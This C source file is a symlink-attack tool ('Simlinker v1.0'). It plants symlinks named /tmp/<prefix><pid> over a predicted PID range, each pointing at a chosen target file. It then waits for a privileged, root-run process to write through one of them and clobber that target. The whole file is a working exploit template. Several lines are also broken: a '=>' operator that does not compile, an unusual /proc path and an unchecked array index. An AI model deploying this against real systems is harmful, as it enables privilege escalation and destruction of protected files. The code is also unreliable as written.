#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>


/*
Symlink creator to abuse files creation in /tmp where the pid is used in the filename.
First we need to take arguments that consist of a range of numbers and a filename to 
link from and a filename to link to.
*/

extern int errno;
int scan_big (int *a, int n);
int get_latest_pid(void);

int
main (int argc, char **argv)
{

  int x = 0, from = 0, to = 0, result = 0, i = 0;
  char dest_name[256];
  char from_name[256];
  struct stat buf;
  time_t t_time_watch, t_time;
  char start_time[26];


  from = getpid ();
  if (argc == 1)
    {

      printf ("Simlinker v1.0\nLarry W. Cashdollar Oct/2019\n\n");
      printf
	("Usage: %s number of symlinks starting from my pid:%d from_file to_file\n",
	 argv[0], from);
      return (0);
    }

  to = atoi (argv[1]);
  to = from + to; //Add the number of links we want to create to our pid as a starting point.

  printf ("Starting from our own process id: %d\n", from);

  snprintf (dest_name, 256, "%s", argv[3]);
  i = stat (dest_name, &buf);
  if (i < 0)
    {
      printf ("ERROR with stat() on %s", dest_name);
      return (-1);
    }

  t_time = buf.st_mtim.tv_sec; //store this as a string in start_time below and
  snprintf (start_time, 25, "%s", ctime (&t_time)); //truncate the \n from the timestamp

  t_time_watch = buf.st_mtim.tv_sec; 
  //Create our block of symlinks that we hope root will write too.
  for (x = from; x <= to; x++)
    {
      sprintf (from_name, "/tmp/%s%d", argv[2], x);
      printf ("Symlinking %s->%s\n", from_name, dest_name);
      result = symlink (dest_name, from_name);

      if (result < 0)
	{
	  printf ("Error: %d, %s\n", result, strerror (errno));
	  return (-1);
	}
    }

  printf("Waiting on a write to one of our predicted links in /tmp or pid to grow past the links we created.\n");
// Watch the target file to see if it's over written and check to see if the newest process pid
// is larger than our biggest predicted pid.  If so exit because we failed.
  while (t_time == t_time_watch)
    {
      i = stat (dest_name, &buf);
      t_time_watch = buf.st_mtim.tv_sec;
      if (get_latest_pid() => to) {
        printf("Failed: The next pid will be past our largest predicted pid in /tmp links\ntry a larger number of links for busier systems.\n");
	exit(1);
      }

    }

  if (t_time != t_time_watch)
    {

      printf ("[+] The target file %s has been over written!\n", dest_name);
      printf ("[+] Modification time changed from %s to %s\n", start_time,
	      ctime (&t_time_watch));

    }

  return (0);
}


int
get_latest_pid(void)
{
  DIR *dirp;
  struct dirent *direntp;
  int x = 0,array[256];

  dirp = opendir ("/proc/pinfo");
  while ((direntp = readdir (dirp)) != NULL)
    {
      if (strstr (direntp->d_name, ".") == 0)
	array[x] = atoi (direntp->d_name);
      x++;
    }
  closedir (dirp);
  return(scan_big (array, x));
}


int
scan_big (int *a, int n)
{
  int big = 0, x;
  big = a[0];
  for (x = 0; x < n; x++)
    {
      if (a[x] > big)
	big = a[x];
    }
  return (big);
}
